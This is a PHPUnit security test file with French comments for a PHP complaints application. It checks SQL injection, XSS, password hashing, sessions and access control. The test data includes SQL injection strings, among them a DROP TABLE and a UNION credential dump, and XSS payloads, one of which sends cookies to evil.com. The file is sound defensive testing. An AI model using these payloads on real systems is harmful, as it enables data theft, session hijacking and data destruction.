<?php
use PHPUnit\Framework\TestCase;

class SecurityTest extends TestCase
{
    private PDO    $pdo;
    private string $baseUrl;

    protected function setUp(): void
    {
        $this->pdo = new PDO(
            "mysql:host=" . getenv('DB_HOST') . ";port=3306;dbname=" . getenv('DB_NAME') . ";charset=utf8mb4",
            getenv('DB_USER'),
            getenv('DB_PASS'),
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );
        $this->baseUrl = getenv('APP_URL') ?: 'http://localhost:8080';
    }

    // ── SQL INJECTION ──────────────────────────────────────────

    // Test 1 : injection SQL sur users.email bloquée par prepared statement
    public function testSqlInjectionOnEmailBlocked()
    {
        $malicious = "' OR '1'='1' --";

        $stmt = $this->pdo->prepare(
            "SELECT COUNT(*) FROM users WHERE email = :email AND mot_de_passe = :mdp"
        );
        $stmt->execute([':email' => $malicious, ':mdp' => $malicious]);
        $count = (int) $stmt->fetchColumn();

        $this->assertEquals(0, $count, "Injection SQL réussie sur users.email — utiliser des prepared statements");
    }

    // Test 2 : UNION injection sur users bloquée
    public function testUnionInjectionOnUsersBlocked()
    {
        $malicious = "' UNION SELECT id, email, mot_de_passe, role, nom FROM users --";

        $stmt = $this->pdo->prepare("SELECT email FROM users WHERE email = ?");
        $stmt->execute([$malicious]);
        $result = $stmt->fetchAll();

        $this->assertEmpty($result, "UNION injection a produit des résultats sur la table users");
    }

    // Test 3 : injection sur reclamations.objet bloquée
    public function testSqlInjectionOnObjetBlocked()
    {
        $malicious = "'; DROP TABLE reclamations; --";

        $stmt = $this->pdo->prepare("SELECT COUNT(*) FROM reclamations WHERE objet = ?");
        $stmt->execute([$malicious]);
        // La table doit toujours exister
        $check = $this->pdo->query("SHOW TABLES LIKE 'reclamations'")->fetchColumn();
        $this->assertNotFalse($check, "La table reclamations a été supprimée par injection");
    }

    // ── XSS ───────────────────────────────────────────────────

    // Test 4 : XSS dans objet de réclamation neutralisé
    public function testXssInObjetNeutralized()
    {
        $input  = '<script>alert("xss")</script>';
        $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
        $this->assertStringNotContainsString('<script>', $output);
        $this->assertStringContainsString('&lt;script&gt;', $output);
    }

    // Test 5 : XSS dans description de réclamation neutralisé
    public function testXssInDescriptionNeutralized()
    {
        $input  = '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">';
        $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
        $this->assertStringNotContainsString('onerror', $output);
        $this->assertStringNotContainsString('<img', $output);
    }

    // Test 6 : XSS dans commentaire neutralisé
    public function testXssInCommentaireNeutralized()
    {
        $input  = '<a href="javascript:alert(1)">click</a>';
        $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
        $this->assertStringNotContainsString('javascript:', $output);
    }

    // ── MOT DE PASSE ──────────────────────────────────────────

    // Test 7 : le mot de passe est stocké haché (colonne mot_de_passe)
    public function testPasswordIsStoredHashed()
    {
        $plain = "TestPassword123!";
        $hash  = password_hash($plain, PASSWORD_BCRYPT);

        $this->assertNotEquals($plain, $hash);
        $this->assertTrue(password_verify($plain, $hash));
        // Vérifier le format bcrypt ($2y$) utilisé dans la base
        $this->assertStringStartsWith('$2y$', $hash);
    }

    // Test 8 : les mots de passe en base sont bien du bcrypt
    public function testExistingPasswordsAreBcrypt()
    {
        $stmt  = $this->pdo->query("SELECT mot_de_passe FROM users LIMIT 3");
        $hashes = $stmt->fetchAll(PDO::FETCH_COLUMN);

        foreach ($hashes as $hash) {
            $this->assertMatchesRegularExpression(
                '/^\$2[ay]\$/',
                $hash,
                "Un mot de passe en base n'est pas en bcrypt : $hash"
            );
        }
    }

    // Test 9 : deux hachages du même mot de passe sont différents (salt aléatoire)
    public function testPasswordHashesAreDifferentDueToSalt()
    {
        $plain = "SamePassword";
        $hash1 = password_hash($plain, PASSWORD_BCRYPT);
        $hash2 = password_hash($plain, PASSWORD_BCRYPT);
        $this->assertNotEquals($hash1, $hash2, "Les hachages doivent différer grâce au salt aléatoire");
    }

    // ── SESSION ───────────────────────────────────────────────

    // Test 10 : l'ID de session est régénéré après login (anti-fixation)
    public function testSessionIdIsRegeneratedAfterLogin()
    {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        $oldId = session_id();
        session_regenerate_id(true);
        $newId = session_id();

        $this->assertNotEquals($oldId, $newId, "L'ID de session doit être régénéré après login");
        session_destroy();
    }

    // Test 11 : accès page protégée sans session retourne 302/403
    public function testProtectedPageBlockedWithoutSession()
    {
        $ch = curl_init($this->baseUrl . '/index/dashboard.php');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $this->assertContains(
            $code,
            [301, 302, 403],
            "Une page protégée sans session doit rediriger ou bloquer (code reçu : $code)"
        );
    }

    // Test 12 : rôle admin non accessible à un Réclamant
    public function testRoleAdminNotAccessibleToReclamant()
    {
        $stmt  = $this->pdo->prepare("SELECT role FROM users WHERE email = ?");
        $stmt->execute(['reclamant@email.com']);
        $role  = $stmt->fetchColumn();

        $this->assertNotEquals('admin', $role, "Le compte reclamant ne doit pas avoir le rôle admin");
    }
}